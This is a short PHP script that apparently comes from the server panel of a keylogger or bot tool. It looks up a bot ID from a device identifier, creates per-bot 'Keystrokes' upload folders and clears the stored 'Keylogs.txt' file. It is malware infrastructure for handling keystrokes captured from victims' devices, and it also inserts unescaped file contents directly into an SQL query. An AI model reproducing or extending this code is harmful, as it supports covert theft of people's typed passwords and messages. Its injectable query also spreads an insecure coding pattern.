
<?php
									 
									 include 'DatabaseConfig.php' ;
 
                  $mysqli = mysqli_connect($HostName,$HostUser,$HostPass,$DatabaseName);
				    $content =  file_get_contents("../config.txt");
                 $query = ("SELECT clm_id, clm_device_id FROM `tbl_device` WHERE clm_device_id = $content" );

 
                 if ($result = $mysqli->query($query)) {
                     while ($row = $result->fetch_assoc()) {
                   $botid = $row["clm_id"];
					
                    
						 
                         $path = "../alienw/uploads/$botid/Keystrokes";
				       $french = "../alienw/uploads/$botid/";
					     $ost = "../alienw/uploads/$botid/Keystrokes/Keylogs.txt";


                      $dh = opendir($path);
					  if( is_dir($french) === false )
                                      {
                        mkdir($french);
                      }
					    if( is_dir($path) === false )
                                      {
                        mkdir($path);
                      }
			
					  $count = "";
                            $i=1;
							
							if (is_dir_empty($path)) {
						  
                            }
							
							else{
                         
                           $fh = fopen( $ost, 'w' );
                            fclose($fh);

				
							}
                        }
					 	 }
				 
				 
				 function is_dir_empty($dir) {
                        if (!is_readable($dir)) return NULL; 
                      return (count(scandir($dir)) == 2);
                           }
				 
                    ?> 